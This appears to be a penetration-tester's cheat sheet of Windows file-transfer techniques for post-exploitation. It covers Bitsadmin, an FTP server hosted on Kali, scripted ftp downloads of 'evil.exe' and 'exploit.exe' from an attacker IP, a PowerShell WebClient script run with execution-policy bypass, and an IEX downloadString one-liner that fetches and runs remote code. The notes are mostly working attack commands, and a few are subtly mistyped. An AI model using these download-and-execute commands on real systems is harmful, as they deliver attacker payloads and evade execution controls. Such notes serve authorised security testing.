# TFTP

- to be continued

# Bitsadmin (cmd needs admin permission)
- Bitsadmin /transfer n http://url saved_path

# FTP (pyftpdlib client on Kali)

- Ftp is generally installed on Windows machines
- To make it interactive, use -s option

## On Kali install a ftp client and set a username/password

```
python3 -m pip install pyftpdlib  
python3 -m pyftpdlib -p 21 -u root(username) -P root(pass) -d path(current dir by default)
```

## on Windows

```
ftp <attackerip>
> binary
> lcd
> get exploit.exe
```


### On Windows

```
echo open <attackerip> 21> ftp.txt
echo USER username password >> ftp.txt
echo bin >> ftp.txt
echo GET evil.exe >> ftp.txt
echo bye >> ftp.txt
ftp -s:ftp.txt
```


# Powershell

```
echo $storageDir = $pwd > wget.ps1
echo $webclient = New-Object System.Net.WebClient >>wget.ps1
echo $url = "http://<attackerip>/powerup.ps1" >>wget.ps1
echo $file = "powerup.ps1" >>wget.ps1
echo $webclient.DownloadFile($url,$file) >>wget.ps1
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
```

## Powershell download a file

```
powershell "IEX(New Object Net.WebClient).downloadString('http://<targetip>/file.ps1')"
powershell -exec bypass -c (new-object System.Net.WebClient).DownloadFile('http://<targetip>/file.ps1'.'savedpath')
```
